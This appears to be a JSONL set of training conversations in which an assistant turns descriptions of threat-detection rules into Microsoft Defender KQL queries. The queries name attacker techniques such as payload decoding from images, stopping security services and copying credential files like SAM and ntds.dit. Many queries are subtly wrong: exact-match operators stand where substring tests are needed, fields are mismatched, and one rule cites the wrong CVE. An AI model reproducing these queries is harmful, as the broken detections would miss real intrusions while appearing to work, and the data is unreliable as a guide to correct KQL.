{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of tail to extract bytes at an offset from an image and then decode the base64 value to create a new file with the decoded content. The detected execution is a bash one-liner.\n Topic: proc_creation_macos_tail_base64_decode_from_image"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"base64\", \"-d\", \">\")) and (ProcessCommandLine in~ (\".avif\", \".gif\", \".jfif\", \".jpeg\", \".jpg\", \".pjp\", \".pjpeg\", \".png\", \".svg\", \".webp\")) and InitiatingProcessFolderPath =~ \"/bash\" and (ProcessCommandLine in~ (\"tail\", \"-c\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the stopping of a Windows service via the \"net\" utility. Topic: proc_creation_win_net_stop_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" stop \" and ((ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")) or (FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious manipulations of default accounts such as administrator and guest. For example enable or disable accounts or change the password...etc Topic: proc_creation_win_net_user_default_accounts_manipulation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\"))) and ProcessCommandLine =~ \" user \" and (ProcessCommandLine in~ (\" J\u00e4rjestelm\u00e4nvalvoja \", \" Rendszergazda \", \" \u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440 \", \" Administrateur \", \" Administrador \", \" Administrat\u00f6r \", \" Administrator \", \" guest \", \" DefaultAccount \", \" \\\"J\u00e4rjestelm\u00e4nvalvoja\\\" \", \" \\\"Rendszergazda\\\" \", \" \\\"\u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440\\\" \", \" \\\"Administrateur\\\" \", \" \\\"Administrador\\\" \", \" \\\"Administrat\u00f6r\\\" \", \" \\\"Administrator\\\" \", \" \\\"guest\\\" \", \" \\\"DefaultAccount\\\" \", \" 'J\u00e4rjestelm\u00e4nvalvoja' \", \" 'Rendszergazda' \", \" '\u0410\u0434\u043c\u0438\u043d\u0438\u0441\u0442\u0440\u0430\u0442\u043e\u0440' \", \" 'Administrateur' \", \" 'Administrador' \", \" 'Administrat\u00f6r' \", \" 'Administrator' \", \" 'guest' \", \" 'DefaultAccount' \"))) and (not((ProcessCommandLine in~ (\"guest\", \"/active no\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects handle requests and access operations to specific registry keys to calculate the SysKey Topic: win_security_syskey_registry_access"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"lsa\\\\JD\" or RegistryKey endswith \"lsa\\\\GBG\" or RegistryKey endswith \"lsa\\\\Skew1\" or RegistryKey endswith \"lsa\\\\Data\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest cmdlet Topic: proc_creation_win_powershell_download_dll"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"http\", \"OutFile\", \".dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p. Topic: proc_creation_win_lolbin_rasautou_dll_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -d \", \" -p \")) and (FolderPath endswith \"\\\\rasautou.exe\" or ProcessVersionInfoOriginalFileName =~ \"rasdlui.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of ie4uinit.exe to execute commands from a specially prepared ie4uinit.inf file from a directory other than the usual directories Topic: proc_creation_win_lolbin_ie4uinit"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\ie4uinit.exe\" or ProcessVersionInfoOriginalFileName =~ \"IE4UINIT.EXE\") and (not(((InitiatingProcessFolderPath in~ (\"c:\\\\windows\\\\system32\\\\\", \"c:\\\\windows\\\\sysWOW64\\\\\")) or isnull(InitiatingProcessFolderPath))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an executable, which is not an internet browser or known application, initiating network connections to legit popular websites, which were seen to be used as dead drop resolvers in previous attacks.\nIn this context attackers leverage known websites such as \"facebook\", \"youtube\", etc. In order to pass through undetected.\n Topic: net_connection_win_domain_dead_drop_resolvers"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (RemoteUrl in~ (\".t.me\", \"4shared.com\", \"abuse.ch\", \"anonfiles.com\", \"cdn.discordapp.com\", \"cloudflare.com\", \"ddns.net\", \"discord.com\", \"docs.google.com\", \"drive.google.com\", \"dropbox.com\", \"dropmefiles.com\", \"facebook.com\", \"feeds.rapidfeeds.com\", \"fotolog.com\", \"ghostbin.co/\", \"githubusercontent.com\", \"gofile.io\", \"hastebin.com\", \"imgur.com\", \"livejournal.com\", \"mediafire.com\", \"mega.co.nz\", \"mega.nz\", \"onedrive.com\", \"pages.dev\", \"paste.ee\", \"pastebin.com\", \"pastebin.pl\", \"pastetext.net\", \"pixeldrain.com\", \"privatlab.com\", \"privatlab.net\", \"reddit.com\", \"send.exploit.in\", \"sendspace.com\", \"steamcommunity.com\", \"storage.googleapis.com\", \"technet.microsoft.com\", \"temp.sh\", \"transfer.sh\", \"trycloudflare.com\", \"twitter.com\", \"ufile.io\", \"vimeo.com\", \"w3spaces.com\", \"wetransfer.com\", \"workers.dev\", \"youtube.com\"))) and (not((InitiatingProcessFolderPath =~ \"\\\\avant.exe\" or InitiatingProcessFolderPath =~ \"\\\\brave.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\")) or InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\" or ((InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\Windows Defender Advanced Threat Protection\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\Windows Defender\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\\") and (InitiatingProcessFolderPath in~ (\"\\\\MsMpEng.exe\", \"\\\\MsSense.exe\"))) or (InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Discord\\\\\" and InitiatingProcessFolderPath =~ \"\\\\Discord.exe\" and (RemoteUrl in~ (\"discord.com\", \"cdn.discordapp.com\"))) or ((InitiatingProcessFolderPath in~ (\"\\\\Dropbox.exe\", \"\\\\DropboxInstaller.exe\")) and RemoteUrl =~ \"dropbox.com\") or (InitiatingProcessFolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeWebView\\\\Application\\\\\" or InitiatingProcessFolderPath endswith \"\\\\WindowsApps\\\\MicrosoftEdge.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\", \"C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"))) or (InitiatingProcessFolderPath in~ (\"\\\\msedge.exe\", \"\\\\msedgewebview2.exe\")) or InitiatingProcessFolderPath =~ \"\" or InitiatingProcessFolderPath =~ \"\\\\falkon.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\", \"C:\\\\Program Files (x86)\\\\Mozilla Firefox\\\\firefox.exe\")) or InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Mozilla Firefox\\\\firefox.exe\" or (InitiatingProcessFolderPath has_all (\"\\\\Flock.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Flock\\\\\") or ((InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\Google\\\\Drive File Stream\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\Program Files (x86)\\\\Google\\\\Drive File Stream\\\\\") and InitiatingProcessFolderPath =~ \"GoogleDriveFS.exe\" and RemoteUrl =~ \"drive.google.com\") or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\", \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\")) or (InitiatingProcessFolderPath has_all (\"\\\\maxthon.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Maxthon\\\\\") or ((InitiatingProcessFolderPath in~ (\"\\\\MEGAsync.exe\", \"\\\\MEGAsyncSetup32.exe\", \"\\\\MEGAsyncSetup64.exe\", \"\\\\MEGAupdater.exe\") or (InitiatingProcessFolderPath contains \"\\\\MEGAsyncSetup32_\" and InitiatingProcessFolderPath contains \"RC.exe\")) and (RemoteUrl in~ (\"mega.co.nz\", \"mega.nz\"))) or (InitiatingProcessFolderPath has_all (\"\\\\Midori Next Generation.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Programs\\\\midori-ng\\\\\") or isnull(InitiatingProcessFolderPath) or (InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\\" and InitiatingProcessFolderPath =~ \"\\\\OneDrive.exe\" and RemoteUrl =~ \"onedrive.com\") or (InitiatingProcessFolderPath has_all (\"\\\\opera.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Programs\\\\Opera\\\\\") or (InitiatingProcessFolderPath has_all (\"\\\\Phoebe.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Phoebe\\\\\") or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\PRTG Network Monitor\\\\PRTG Probe.exe\", \"C:\\\\Program Files\\\\PRTG Network Monitor\\\\PRTG Probe.exe\")) or InitiatingProcessFolderPath =~ \"\\\\QtWeb.exe\" or ((InitiatingProcessFolderPath contains \"C:\\\\Program Files (x86)\\\\Safari\\\\\" or InitiatingProcessFolderPath contains \"C:\\\\Program Files\\\\Safari\\\\\") and InitiatingProcessFolderPath =~ \"\\\\safari.exe\") or InitiatingProcessFolderPath =~ \"\\\\seamonkey.exe\" or InitiatingProcessFolderPath =~ \"\\\\slimbrowser.exe\" or (InitiatingProcessFolderPath contains \"\\\\AppData\\\\Roaming\\\\Telegram Desktop\\\\\" and InitiatingProcessFolderPath =~ \"\\\\Telegram.exe\" and RemoteUrl =~ \".t.me\") or (InitiatingProcessFolderPath has_all (\"\\\\vivaldi.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Vivaldi\\\\\") or InitiatingProcessFolderPath =~ \"\\\\whale.exe\" or InitiatingProcessFolderPath =~ \"\\\\Waterfox.exe\" or (InitiatingProcessFolderPath =~ \"\\\\WhatsApp.exe\" and RemoteUrl =~ \"facebook.com\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects UTF-8 and UTF-16 Base64 encoded powershell Invoke- calls Topic: proc_creation_win_powershell_base64_invoke"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -e\" and (ProcessCommandLine in~ (\"SQBuAHYAbwBrAGUALQ\", \"kAbgB2AG8AawBlAC0A\", \"JAG4AdgBvAGsAZQAtA\", \"SW52b2tlL\", \"ludm9rZS\", \"JbnZva2Ut\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a process executing as user called \"ANONYMOUS\" seen used by the \"MileStone2016\" variant of COLDSTEEL Topic: proc_creation_win_malware_coldsteel_anonymous_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessAccountName =~ \"ANONYMOUS\" and (InitiatingProcessFileName in~ (\"\\\\Windows\\\\System32\\\\\", \"\\\\AppData\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects disabling security tools Topic: proc_creation_lnx_security_tools_disabling"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"cbdaemon\", \"stop\")) and InitiatingProcessFolderPath =~ \"/service\") or ((ProcessCommandLine in~ (\"cbdaemon\", \"off\")) and InitiatingProcessFolderPath =~ \"/chkconfig\") or ((ProcessCommandLine in~ (\"cbdaemon\", \"stop\")) and InitiatingProcessFolderPath =~ \"/systemctl\") or ((ProcessCommandLine in~ (\"cbdaemon\", \"disable\")) and InitiatingProcessFolderPath =~ \"/systemctl\") or ((ProcessCommandLine in~ (\"stop\", \"falcon-sensor\")) and InitiatingProcessFolderPath =~ \"/systemctl\") or ((ProcessCommandLine in~ (\"disable\", \"falcon-sensor\")) and InitiatingProcessFolderPath =~ \"/systemctl\") or ((ProcessCommandLine in~ (\"firewalld\", \"stop\")) and InitiatingProcessFolderPath =~ \"/systemctl\") or ((ProcessCommandLine in~ (\"firewalld\", \"disable\")) and InitiatingProcessFolderPath =~ \"/systemctl\") or ((ProcessCommandLine in~ (\"iptables\", \"stop\")) and InitiatingProcessFolderPath =~ \"/service\") or ((ProcessCommandLine in~ (\"ip6tables\", \"stop\")) and InitiatingProcessFolderPath =~ \"/service\") or ((ProcessCommandLine in~ (\"iptables\", \"stop\")) and InitiatingProcessFolderPath =~ \"/chkconfig\") or ((ProcessCommandLine in~ (\"ip6tables\", \"stop\")) and InitiatingProcessFolderPath =~ \"/chkconfig\") or (ProcessCommandLine =~ \"0\" and InitiatingProcessFolderPath =~ \"/setenforce\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems Topic: proc_creation_win_netsh_fw_rules_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"config \", \"state \", \"rule \", \"name=all\")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe Topic: proc_creation_win_susp_file_characteristics"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessVersionInfoFileDescription =~ \"?\" and ProcessVersionInfoProductVersion =~ \"?\") or (ProcessVersionInfoFileDescription =~ \"?\" and ProcessVersionInfoProductName =~ \"?\") or (ProcessVersionInfoFileDescription =~ \"?\" and ProcessVersionInfoCompanyName =~ \"?\")) and FolderPath contains \"\\\\Downloads\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious Windows Error Reporting manager (wermgr.exe) child process Topic: proc_creation_win_wermgr_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\wermgr.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\ipconfig.exe\", \"\\\\mshta.exe\", \"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\netstat.exe\", \"\\\\nslookup.exe\", \"\\\\powershell_ise.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\systeminfo.exe\", \"\\\\whoami.exe\", \"\\\\wscript.exe\"))) and (not(((ProcessCommandLine in~ (\"-queuereporting\", \"-responsepester\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to exploit an apache spark server via CVE-2014-6287 from a commandline perspective Topic: proc_creation_lnx_cve_2022_33891_spark_shell_command_injection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\bash\" and (ProcessCommandLine in~ (\"id -Gn `\", \"id -Gn '\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of known compromised version of 3CXDesktopApp Topic: proc_creation_win_malware_3cx_compromise_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessVersionInfoOriginalFileName =~ \"3CXDesktopApp.exe\" or FolderPath endswith \"\\\\3CXDesktopApp.exe\" or ProcessVersionInfoProductName =~ \"3CX Desktop App\") and ProcessVersionInfoProductVersion contains \"18.12.\") or ((SHA256 startswith \"DDE03348075512796241389DFEA5560C20A3D2A2EAC95C894E7BBED5E85A0ACC\" or SHA256 startswith \"54004DFAA48CA5FA91E3304FB99559A2395301C570026450882D6AAD89132A02\" or SHA256 startswith \"D45674F941BE3CCA2FBC1AF42778043CC18CD86D95A2ECB9E6F0E212ED4C74AE\" or SHA256 startswith \"FAD482DED2E25CE9E1DD3D3ECC3227AF714BDFBBDE04347DBC1B21D6A3670405\" or SHA256 startswith \"5D99EFA36F34AA6B43CD81E77544961C5C8D692C96059FEF92C2DF2624550734\" or SHA256 startswith \"A60A61BF844BC181D4540C9FAC53203250A982E7C3AD6153869F01E19CC36203\" or SHA256 startswith \"AA124A4B4DF12B34E74EE7F6C683B2EBEC4CE9A8EDCF9BE345823B4FDCF5D868\" or SHA256 startswith \"59E1EDF4D82FAE4978E97512B0331B7EB21DD4B838B850BA46794D9C7A2C0983\") or (SHA1 startswith \"480DC408EF50BE69EBCF84B95750F7E93A8A1859\" or SHA1 startswith \"3B43A5D8B83C637D00D769660D01333E88F5A187\" or SHA1 startswith \"6285FFB5F98D35CD98E78D48B63A05AF6E4E4DEA\" or SHA1 startswith \"E272715737B51C01DC2BED0F0AEE2BF6FEEF25F1\" or SHA1 startswith \"8433A94AEDB6380AC8D4610AF643FB0E5220C5CB\" or SHA1 startswith \"413D9CBFCBF8D1E8304EAB0AA5484F5EEC5185F5\" or SHA1 startswith \"BEA77D1E59CF18DCE22AD9A2FAD52948FD7A9EFA\" or SHA1 startswith \"BFECB8CE89A312D2EF4AFC64A63847AE11C6F69E\") or (MD5 startswith \"BB915073385DD16A846DFA318AFA3C19\" or MD5 startswith \"08D79E1FFFA244CC0DC61F7D2036ACA9\" or MD5 startswith \"4965EDF659753E3C05D800C6C8A23A7A\" or MD5 startswith \"9833A4779B69B38E3E51F04E395674C6\" or MD5 startswith \"704DB9184700481A56E5100FB56496CE\" or MD5 startswith \"8EE6802F085F7A9DF7E0303E65722DC0\" or MD5 startswith \"F3D4144860CA10BA60F7EF4D176CC736\" or MD5 startswith \"0EEB1C0133EB4D571178B2D9D14CE3E9\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect possible persistence using Fax DLL load when service restart Topic: registry_set_fax_dll_persistance"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Software\\\\Microsoft\\\\Fax\\\\Device Providers*\" and RegistryKey contains \"\\\\ImageName\") and (not(RegistryValueData =~ \"%systemroot%\\\\system32\\\\fxst30.dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the doas tool execution in linux host platform. This utility tool allow standard users to perform tasks as root, the same way sudo does. Topic: proc_creation_lnx_doas_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/doas\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\nCheck if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\n Topic: proc_creation_win_net_groups_and_accounts_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\"))) and ((((ProcessCommandLine in~ (\"domain admins\", \" administrator\", \" administrateur\", \"enterprise admins\", \"Exchange Trusted Subsystem\", \"Remote Desktop Users\", \"Utilisateurs du Bureau \u00e0 distance\", \"Usuarios de escritorio remoto\", \" /do\")) and (ProcessCommandLine in~ (\" group \", \" localgroup \"))) and (not(ProcessCommandLine =~ \" /add\"))) or (ProcessCommandLine has_all (\" /do\", \" accounts \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190 / Follina exploitation Topic: proc_creation_win_msdt_susp_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\msdt.exe\" or ProcessVersionInfoOriginalFileName =~ \"msdt.exe\") and (InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\schtasks.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\", \"\\\\wsl.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of CleanWipe a tool usually used to delete Symantec antivirus. Topic: proc_creation_win_pua_cleanwipe"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\SepRemovalToolNative_x64.exe\" or (ProcessCommandLine =~ \"--uninstall\" and InitiatingProcessFolderPath =~ \"\\\\CATClean.exe\") or (ProcessCommandLine =~ \"-r\" and InitiatingProcessFolderPath =~ \"\\\\NetInstaller.exe\") or ((ProcessCommandLine in~ (\"/uninstall\", \"/enterprise\")) and InitiatingProcessFolderPath =~ \"\\\\WFPUnins.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of base64 utility to decode arbitrary base64-encoded text Topic: proc_creation_lnx_base64_decode"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"-d\" and InitiatingProcessFolderPath =~ \"/base64\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a command used by conti to dump database Topic: proc_creation_win_malware_conti_ransomware_database_dump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"sys.sysprocesses\", \"master.dbo.sysdatabases\", \"BACKUP DATABASE\")) and ProcessCommandLine =~ \" -S localhost \" and (FolderPath endswith \"\\\\sqlcmd.exe\" or (ProcessCommandLine contains \"sqlcmd \" or ProcessCommandLine contains \"sqlcmd.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec Topic: proc_creation_win_susp_inline_win_api_access"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"AddSecurityPackage\", \"AdjustTokenPrivileges\", \"Advapi32\", \"CloseHandle\", \"CreateProcessWithToken\", \"CreatePseudoConsole\", \"CreateRemoteThread\", \"CreateThread\", \"CreateUserThread\", \"DangerousGetHandle\", \"DuplicateTokenEx\", \"EnumerateSecurityPackages\", \"FreeHGlobal\", \"FreeLibrary\", \"GetDelegateForFunctionPointer\", \"GetLogonSessionData\", \"GetModuleHandle\", \"GetProcAddress\", \"GetProcessHandle\", \"GetTokenInformation\", \"ImpersonateLoggedOnUser\", \"kernel32\", \"LoadLibrary\", \"memcpy\", \"MiniDumpWriteDump\", \"ntdll\", \"OpenDesktop\", \"OpenProcess\", \"OpenProcessToken\", \"OpenThreadToken\", \"OpenWindowStation\", \"PtrToString\", \"QueueUserApc\", \"ReadProcessMemory\", \"RevertToSelf\", \"RtlCreateUserThread\", \"secur32\", \"SetThreadToken\", \"VirtualAlloc\", \"VirtualFree\", \"VirtualProtect\", \"WaitForSingleObject\", \"WriteInt32\", \"WriteProcessMemory\", \"ZeroFreeGlobalAllocUnicode\")) and (not((ProcessCommandLine =~ \"GetLoadLibraryWAddress32\" and InitiatingProcessFolderPath =~ \"\\\\MpCmdRun.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Commandline to launch powershell with a base64 payload Topic: proc_creation_win_powershell_encode"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" -e \", \" -en \", \" -enc \", \" -enco\", \" -ec \")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) and (not(((InitiatingProcessFileName in~ (\"C:\\\\Packages\\\\Plugins\\\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\\\", \"\\\\gc_worker.exe\")) or ProcessCommandLine =~ \" -Encoding \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the malicious use of a control panel item Topic: proc_creation_win_control_panel_item"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"add\", \"CurrentVersion\\\\Control Panel\\\\CPLs\")) and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\")) or (ProcessCommandLine endswith \".cpl\" and (not(((ProcessCommandLine in~ (\"regsvr32 \", \" /s \", \"igfxCPL.cpl\")) or (ProcessCommandLine in~ (\"\\\\System32\\\\\", \"%System%\", \"|C:\\\\Windows\\\\system32|\"))))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Potential adversaries stopping ETW providers recording loaded .NET assemblies. Topic: registry_set_dot_net_etw_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\ETWEnabled\" and RegistryValueData =~ \"DWORD (0x00000000)\") or ((RegistryKey endswith \"\\\\COMPlus_ETWEnabled\" or RegistryKey endswith \"\\\\COMPlus_ETWFlags\") and (RegistryValueData in~ (\"0\", \"DWORD (0x00000000)\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Files with well-known filenames (sensitive files with credential data) copying Topic: proc_creation_win_esentutl_sensitive_file_copy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"vss\" or ProcessCommandLine contains \" -m \" or ProcessCommandLine contains \" /m \" or ProcessCommandLine contains \" \u2013m \" or ProcessCommandLine contains \" \u2014m \" or ProcessCommandLine contains \" \u2015m \" or ProcessCommandLine contains \" -y \" or ProcessCommandLine contains \" /y \" or ProcessCommandLine contains \" \u2013y \" or ProcessCommandLine contains \" \u2014y \" or ProcessCommandLine contains \" \u2015y \") and (FolderPath endswith \"\\\\esentutl.exe\" or ProcessVersionInfoOriginalFileName =~ \"\\\\esentutl.exe\")) or (ProcessCommandLine in~ (\"\\\\config\\\\RegBack\\\\sam\", \"\\\\config\\\\RegBack\\\\security\", \"\\\\config\\\\RegBack\\\\system\", \"\\\\config\\\\sam\", \"\\\\config\\\\security\", \"\\\\config\\\\system \", \"\\\\repair\\\\sam\", \"\\\\repair\\\\security\", \"\\\\repair\\\\system\", \"\\\\windows\\\\ntds\\\\ntds.dit\"))"}]}
